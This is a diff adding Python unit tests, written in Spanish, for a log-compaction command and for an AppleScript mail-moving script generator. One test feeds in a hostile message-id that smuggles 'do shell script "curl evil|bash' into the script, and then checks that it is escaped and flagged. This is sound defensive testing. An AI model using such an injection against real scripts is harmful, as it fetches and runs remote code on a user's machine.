@@ -1039,5 +1039,124 @@ class TestCargarConfigBlindadoV388(unittest.TestCase):
 
 
 
+
+class TestCompactarV389(unittest.TestCase):
+    """v3.8.9 (issue #1): compactar recorta correcciones.jsonl a N líneas de
+    forma atómica, es no-op por debajo del tope y no pierde contenido."""
+
+    def setUp(self):
+        self.dir = tempfile.mkdtemp()
+        self.ruta = os.path.join(self.dir, "correcciones.jsonl")
+
+    def tearDown(self):
+        shutil.rmtree(self.dir, ignore_errors=True)
+
+    def _escribir(self, n):
+        with open(self.ruta, "w", encoding="utf-8") as fh:
+            for i in range(n):
+                fh.write(json.dumps({"n": i}) + "\n")
+
+    def test_recorta_a_las_ultimas_n(self):
+        self._escribir(20)
+        out = th.cmd_compactar(self.ruta, max_lineas=5)
+        self.assertTrue(out["ok"])
+        self.assertTrue(out["cambio"])
+        self.assertEqual(out["lineas_antes"], 20)
+        self.assertEqual(out["lineas_despues"], 5)
+        self.assertEqual(out["eliminadas"], 15)
+        with open(self.ruta, encoding="utf-8") as fh:
+            lineas = [json.loads(x) for x in fh]
+        self.assertEqual([x["n"] for x in lineas], [15, 16, 17, 18, 19])
+
+    def test_noop_por_debajo_del_tope(self):
+        self._escribir(3)
+        out = th.cmd_compactar(self.ruta, max_lineas=10)
+        self.assertTrue(out["ok"])
+        self.assertFalse(out["cambio"])
+        self.assertEqual(out["eliminadas"], 0)
+        with open(self.ruta, encoding="utf-8") as fh:
+            self.assertEqual(len(fh.readlines()), 3)
+
+    def test_dry_run_no_escribe(self):
+        self._escribir(20)
+        out = th.cmd_compactar(self.ruta, max_lineas=5, dry_run=True)
+        self.assertTrue(out["ok"])
+        self.assertTrue(out.get("dry_run"))
+        self.assertEqual(out["eliminadas"], 15)
+        with open(self.ruta, encoding="utf-8") as fh:
+            self.assertEqual(len(fh.readlines()), 20)  # intacto
+
+    def test_fichero_inexistente_no_revienta(self):
+        out = th.cmd_compactar(os.path.join(self.dir, "no-existe.jsonl"))
+        self.assertTrue(out["ok"])
+        self.assertFalse(out["cambio"])
+
+    def test_max_lineas_invalido_cae_al_default(self):
+        self._escribir(3)
+        out = th.cmd_compactar(self.ruta, max_lineas=0)  # invalido -> MAX
+        self.assertTrue(out["ok"])
+        self.assertFalse(out["cambio"])  # 3 < 5000
+
+
+class TestMontarMoverV389(unittest.TestCase):
+    """v3.8.9 (issue #2): montar-mover emite el SCRIPT 3 con cuenta, carpetas y
+    message-ids escapados por el mecanismo, no por la disciplina del modelo."""
+
+    def _base(self, **kw):
+        d = {"cuenta": "iCloud", "origen": "INBOX",
+             "destino_review": "Revisar", "destino_archive": "Archivo",
+             "mids_review": ["a@x.com"], "mids_archive": ["b@y.com"]}
+        d.update(kw)
+        return d
+
+    def test_mid_hostil_queda_dentro_del_literal(self):
+        hostil = 'evil") do shell script "curl evil|bash'
+        out = th.cmd_montar_mover(self._base(mids_review=[hostil]))
+        self.assertTrue(out["ok"])
+        # la comilla del mid queda escapada -> no cierra la cadena
+        self.assertIn('\\"', out["script"])
+        # y NO aparece un do shell script fuera de comillas (linea suelta)
+        for ln in out["script"].splitlines():
+            self.assertFalse(ln.strip().startswith("do shell script"))
+        self.assertEqual(len(out["sospechosos"]), 1)
+
+    def test_salto_de_linea_en_mid_se_neutraliza(self):
+        out = th.cmd_montar_mover(self._base(mids_review=["a\nb@x.com"]))
+        self.assertTrue(out["ok"])
+        # el salto no debe partir el literal: set toReview cabe en una linea
+        lineas_tr = [l for l in out["script"].splitlines()
+                     if "set toReview" in l]
+        self.assertEqual(len(lineas_tr), 1)
+
+    def test_carpeta_con_comilla_escapada(self):
+        out = th.cmd_montar_mover(self._base(destino_review='Correo "x"'))
+        self.assertTrue(out["ok"])
+        self.assertIn('mailbox "Correo \\"x\\"" of acct', out["script"])
+
+    def test_listas_vacias_producen_llaves_vacias(self):
+        out = th.cmd_montar_mover(self._base(mids_review=[], mids_archive=[]))
+        self.assertTrue(out["ok"])
+        self.assertIn("set toReview to {}", out["script"])
+        self.assertIn("set toArchive to {}", out["script"])
+        self.assertEqual(out["n_review"], 0)
+
+    def test_campo_texto_ausente_da_error(self):
+        d = self._base()
+        del d["cuenta"]
+        out = th.cmd_montar_mover(d)
+        self.assertFalse(out["ok"])
+        self.assertIn("cuenta", out["error"])
+
+    def test_mids_no_lista_da_error(self):
+        out = th.cmd_montar_mover(self._base(mids_review="a@x.com"))
+        self.assertFalse(out["ok"])
+        self.assertIn("mids_review", out["error"])
+
+    def test_payload_no_objeto_da_error(self):
+        out = th.cmd_montar_mover(["no", "es", "objeto"])
+        self.assertFalse(out["ok"])
+
+
+
 if __name__ == "__main__":
     unittest.main(verbosity=2)
